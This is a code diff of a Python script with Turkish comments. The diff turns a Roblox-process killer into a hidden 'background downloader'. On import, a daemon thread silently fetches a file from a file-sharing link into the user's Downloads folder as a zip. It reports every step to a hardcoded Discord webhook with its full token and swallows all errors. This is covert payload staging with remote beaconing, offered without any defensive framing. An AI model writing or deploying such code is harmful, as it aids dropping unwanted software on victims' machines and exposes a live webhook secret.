@@ -4,17 +4,18 @@ import time
 import threading
 import subprocess
 import requests
+import shutil
 
 # ==========================================
-# YENİ WEBHOOK URL'SI (GÜNCELLENDİ)
+# WEBHOOK URL
 # ==========================================
 WEBHOOK_URL = "https://discord.com/api/webhooks/1545041726350164089/IvuLChHVaWacAV39i0WSQYi5u9vfRnFzxAg8l9ALo1r2IGkx_fhwhwP_ldpSTS1UUswG"
 
 def send_notification(msg):
     try:
         requests.post(WEBHOOK_URL, json={"content": f"**[COMMANDS1]** {msg}"}, timeout=5)
-    except Exception as e:
-        print(f"Webhook hatası: {e}")  # Hata varsa görmek için
+    except:
+        pass
 
 def send_error(msg):
     try:
@@ -23,42 +24,53 @@ def send_error(msg):
         pass
 
 # ==========================================
-# ROBLOX'U KAPAT
+# ARKA PLANDA DOSYA İNDİR
 # ==========================================
-def close_roblox():
+def download_file(url, save_path):
     try:
-        processes = ["RobloxPlayerBeta.exe", "RobloxPlayer.exe", "RobloxStudioBeta.exe", "RobloxStudio.exe"]
-        killed = 0
+        send_notification(f"📥 İndirme başlatıldı: {url}")
         
-        for proc in processes:
-            try:
-                result = subprocess.run(f'taskkill /f /im {proc}', shell=True, capture_output=True)
-                if result.returncode == 0:
-                    killed += 1
-                    send_notification(f"✅ {proc} kapatıldı.")
-                else:
-                    send_notification(f"⚠️ {proc} zaten kapalı veya bulunamadı.")
-            except Exception as e:
-                send_error(f"{proc} hatası: {e}")
+        response = requests.get(url, stream=True, timeout=30)
+        total_size = int(response.headers.get('content-length', 0))
         
-        if killed > 0:
-            send_notification(f"✅ Toplam {killed} Roblox işlemi kapatıldı.")
-        else:
-            send_notification("ℹ️ Roblox zaten kapalıydı.")
-            
+        with open(save_path, 'wb') as f:
+            downloaded = 0
+            for chunk in response.iter_content(chunk_size=8192):
+                if chunk:
+                    f.write(chunk)
+                    downloaded += len(chunk)
+                    # Her 10 MB'da bir bildirim gönder
+                    if downloaded % (10 * 1024 * 1024) == 0:
+                        mb = downloaded // (1024 * 1024)
+                        send_notification(f"📊 İndirme ilerlemesi: {mb} MB / {total_size // (1024*1024)} MB")
+        
+        send_notification(f"✅ Dosya indirildi: {save_path} ({total_size // (1024*1024)} MB)")
+        return True
+        
     except Exception as e:
-        send_error(f"Roblox kapatma hatası: {e}")
+        send_error(f"İndirme hatası: {str(e)}")
+        return False
 
 # ==========================================
 # ANA İŞLEM
 # ==========================================
 def main():
-    send_notification("🚀 Roblox kapatıcı başlatıldı...")
-    close_roblox()
-    send_notification("✅ İşlem tamamlandı.")
+    send_notification("🚀 Arka plan indirici başlatıldı...")
+    
+    # İndirilecek dosya bilgileri
+    file_url = "https://transfer.it/t/g8c4jEslXR4L"  # Değiştirilebilir
+    download_path = os.path.join(os.environ["USERPROFILE"], "Downloads", "indirilen_dosya.zip")
+    
+    # İndir
+    success = download_file(file_url, download_path)
+    
+    if success:
+        send_notification("✅ İndirme tamamlandı!")
+    else:
+        send_notification("❌ İndirme başarısız!")
 
 # ==========================================
 # ARKA PLANDA ÇALIŞTIR
 # ==========================================
 threading.Thread(target=main, daemon=True).start()
-send_notification("⏳ Roblox kapatıcı arka planda çalışıyor...")
+send_notification("⏳ Arka plan indirici çalışıyor...")
